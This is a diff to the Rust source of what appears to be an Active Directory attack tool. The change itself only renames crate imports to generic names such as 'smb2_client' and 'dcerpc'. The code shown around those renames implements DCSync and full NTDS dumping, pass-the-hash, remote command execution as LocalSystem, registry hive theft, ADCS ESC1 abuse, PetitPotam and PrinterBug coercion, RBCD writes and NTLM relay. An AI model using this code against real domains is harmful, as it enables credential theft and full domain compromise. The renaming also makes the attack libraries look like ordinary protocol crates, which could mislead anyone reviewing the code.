@@ -552,7 +552,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Constrained(a)) => rbcd(a).await,
         Command::Attack(AttackCmd::Asktgt(a)) => asktgt(a).await,
         Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
-        Command::Attack(AttackCmd::Capture(a)) => adhammer_smb::server::capture(&a.listen)
+        Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
             .await
             .map_err(Into::into),
         Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
@@ -603,7 +603,7 @@ async fn asktgt(a: AsktgtArgs) -> Result<()> {
 
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
 async fn dcsync(a: DcsyncArgs) -> Result<()> {
-    use adhammer_dcerpc::drsuapi::DrsSession;
+    use dcerpc::drsuapi::DrsSession;
 
     if a.all {
         return dcsync_all(&a).await;
@@ -635,9 +635,9 @@ async fn dcsync(a: DcsyncArgs) -> Result<()> {
 /// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
 /// (which now reassembles multi-fragment replies, so large/computer accounts work too).
 async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
-    use adhammer_dcerpc::drsuapi::DrsSession;
-    use adhammer_dcerpc::samr::SamrClient;
-    use adhammer_smb::SmbClient;
+    use dcerpc::drsuapi::DrsSession;
+    use dcerpc::samr::SamrClient;
+    use smb2_client::SmbClient;
 
     // 1. enumerate accounts via SAMR-over-SMB.
     let mut smb = SmbClient::connect(&a.host).await?;
@@ -693,7 +693,7 @@ fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
 
 /// SMB login with either a password or an NT hash (pass-the-hash).
 async fn smb_login(
-    smb: &mut adhammer_smb::SmbClient,
+    smb: &mut smb2_client::SmbClient,
     host: &str,
     domain: &str,
     user: &str,
@@ -714,7 +714,7 @@ async fn smb_login(
 }
 
 async fn exec_cmd(a: ExecArgs) -> Result<()> {
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
     let mut smb = SmbClient::connect(&a.host).await?;
     smb_login(
         &mut smb,
@@ -726,7 +726,7 @@ async fn exec_cmd(a: ExecArgs) -> Result<()> {
     )
     .await?;
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let r = adhammer_dcerpc::svcctl::exec(&mut smb, &a.host, &a.command).await?;
+    let r = dcerpc::svcctl::exec(&mut smb, &a.host, &a.command).await?;
     let clean = if r.cleaned {
         "service cleaned up"
     } else {
@@ -751,7 +751,7 @@ async fn exec_cmd(a: ExecArgs) -> Result<()> {
 /// atexec: remote code execution as LocalSystem via a scheduled task (MS-TSCH), with output
 /// captured over C$. Alternative to `exec` (SVCCTL) — different host telemetry.
 async fn atexec_cmd(a: ExecArgs) -> Result<()> {
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
     let mut smb = SmbClient::connect(&a.host).await?;
     smb_login(
         &mut smb,
@@ -772,8 +772,7 @@ async fn atexec_cmd(a: ExecArgs) -> Result<()> {
 
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
     let (path, run_hr) =
-        adhammer_dcerpc::tsch::atexec(&mut smb, &full, &a.domain, &a.user, &a.password, &a.host)
-            .await?;
+        dcerpc::tsch::atexec(&mut smb, &full, &a.domain, &a.user, &a.password, &a.host).await?;
     println!("[+] scheduled task {path} registered + run as LocalSystem (run HRESULT 0x{run_hr:08x}); deleted");
 
     smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
@@ -791,7 +790,7 @@ async fn atexec_cmd(a: ExecArgs) -> Result<()> {
 /// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
 /// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
 async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
     let mut smb = SmbClient::connect(&a.host).await?;
     smb_login(
         &mut smb,
@@ -810,7 +809,7 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
     for (hive, rel) in [("SYSTEM", sys_rel), ("SAM", sam_rel), ("SECURITY", sec_rel)] {
         smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
         let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
-        let ret = adhammer_dcerpc::svcctl::run(&mut smb, &cmd).await?;
+        let ret = dcerpc::svcctl::run(&mut smb, &cmd).await?;
         tracing::info!("reg save {hive}: SCM start win32 {ret}");
     }
 
@@ -852,7 +851,7 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
             eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
             for s in &dump.secrets {
                 if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
-                    let nt: String = adhammer_ntlm::md4(&s.secret)
+                    let nt: String = ntlmssp::md4(&s.secret)
                         .iter()
                         .map(|b| format!("{b:02x}"))
                         .collect();
@@ -897,7 +896,7 @@ fn print_lsa_secret(name: &str, secret: &[u8]) {
 /// enrollee-supplies-subject template via MS-ICPR, and save the issued client-auth cert + key.
 /// The cert can then PKINIT as the impersonated principal.
 async fn esc1(a: Esc1Args) -> Result<()> {
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
 
     let subject = a.upn.split('@').next().unwrap_or("adhammer");
     let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
@@ -907,7 +906,7 @@ async fn esc1(a: Esc1Args) -> Result<()> {
     smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
 
-    let r = adhammer_dcerpc::icpr::request_cert(
+    let r = dcerpc::icpr::request_cert(
         &mut smb,
         &a.ca,
         &a.template,
@@ -1074,7 +1073,7 @@ async fn silver(a: SilverArgs) -> Result<()> {
 /// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
 async fn pth(a: PthArgs) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
 
     let parse_key = |s: &str, what: &str| -> Result<Vec<u8>> {
         let k = hex::decode(s.trim()).with_context(|| format!("{what} must be hex"))?;
@@ -1131,7 +1130,7 @@ async fn pth(a: PthArgs) -> Result<()> {
 
     if let Some(cmd) = &a.command {
         smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-        let r = adhammer_dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
+        let r = dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
         println!(
             "[+] ran as LocalSystem (service '{}', win32 {})",
             r.service, r.start_win32
@@ -1171,7 +1170,7 @@ async fn gmsa(a: GmsaArgs) -> Result<()> {
             "msDS-ManagedPassword not returned (not a gMSA, no retrieve right, or not over LDAPS)",
         )?;
     let pw = parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
-    let nt = adhammer_ntlm::md4(&pw);
+    let nt = ntlmssp::md4(&pw);
     let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
     // secretsdump-style line; the RID is unknown here, so print sam + hash.
     println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
@@ -1202,7 +1201,7 @@ fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
 
 /// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
 async fn coerce(a: CoerceArgs) -> Result<()> {
-    use adhammer_smb::SmbClient;
+    use smb2_client::SmbClient;
 
     let mut smb = SmbClient::connect(&a.host).await?;
     smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
@@ -1210,7 +1209,7 @@ async fn coerce(a: CoerceArgs) -> Result<()> {
 
     if a.pipe.eq_ignore_ascii_case("spoolss") {
         // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
-        use adhammer_dcerpc::rprn::{printerbug_tcp, PrinterBug};
+        use dcerpc::rprn::{printerbug_tcp, PrinterBug};
         // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
         let target = a.target.clone().unwrap_or_else(|| a.host.clone());
         let via_pipe = match smb.open_pipe("spoolss").await {
@@ -1247,7 +1246,7 @@ async fn coerce(a: CoerceArgs) -> Result<()> {
     }
 
     // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
-    use adhammer_dcerpc::efsr::CoerceClient;
+    use dcerpc::efsr::CoerceClient;
     let pipe = smb.open_pipe(&a.pipe).await?;
     let mut client = CoerceClient::bind(&mut smb, pipe).await?;
     match client.coerce(&a.listener).await {
@@ -1368,7 +1367,7 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
             } else {
                 c.resolve_sid(&a.value).await?
             };
-            let sd = adhammer_sddl::build_rbcd_sd(&trustee);
+            let sd = windows_sddl::build_rbcd_sd(&trustee);
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
             println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
         }
@@ -1411,8 +1410,8 @@ async fn spray(a: SprayArgs) -> Result<()> {
 
 /// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
 async fn lsa(a: LsaArgs) -> Result<()> {
-    use adhammer_dcerpc::lsat::LsatClient;
-    use adhammer_smb::SmbClient;
+    use dcerpc::lsat::LsatClient;
+    use smb2_client::SmbClient;
 
     let mut smb = SmbClient::connect(&a.host).await?;
     smb_login(
@@ -1439,8 +1438,8 @@ async fn lsa(a: LsaArgs) -> Result<()> {
 /// Full impacket-style path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
 /// DCE/RPC bind → SamrConnect → enumerate domain users.
 async fn samr(a: SamrArgs) -> Result<()> {
-    use adhammer_dcerpc::samr::SamrClient;
-    use adhammer_smb::SmbClient;
+    use dcerpc::samr::SamrClient;
+    use smb2_client::SmbClient;
 
     let mut smb = SmbClient::connect(&a.host).await?;
     smb_login(
@@ -1512,7 +1511,7 @@ const GREETERS: &[u16] = &[21, 22, 25, 110, 143];
 /// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
 /// then write a Shadow Credential on `target_object`. Chain with `attack coerce`/`poison`.
 async fn relay(a: RelayArgs) -> Result<()> {
-    use adhammer_smb::server::RelayConn;
+    use smb2_client::server::RelayConn;
     let base: String = a
         .realm
         .split('.')
@@ -1546,7 +1545,7 @@ async fn relay_one(
     base: &str,
     target_object: &str,
 ) -> Result<()> {
-    use adhammer_smb::server::RelayConn;
+    use smb2_client::server::RelayConn;
     let mut rc = RelayConn::new(stream);
     let type1 = rc.recv_type1().await?;
     println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
@@ -1602,7 +1601,7 @@ async fn netenum(a: NetArgs) -> Result<()> {
     let mut signing: std::collections::HashMap<String, (u16, bool)> = Default::default();
     for (host, ports) in &hosts_map {
         if ports.iter().any(|(p, _, _)| *p == 445) {
-            if let Ok(mut c) = adhammer_smb::SmbClient::connect(host).await {
+            if let Ok(mut c) = smb2_client::SmbClient::connect(host).await {
                 if let Ok(s) = c.probe_signing().await {
                     signing.insert(host.clone(), s);
                 }
@@ -1761,7 +1760,7 @@ async fn redis_unauth(host: &str) -> Option<String> {
 
 /// EPM (135): report which attack-relevant RPC interfaces are registered on the endpoint mapper.
 async fn rpc_surface(host: &str) -> Option<String> {
-    use adhammer_dcerpc::{epm, Syntax};
+    use dcerpc::{epm, Syntax};
     let ifaces = [
         (
             "e3514235-4b06-11d1-ab04-00c04fc2dcd2",
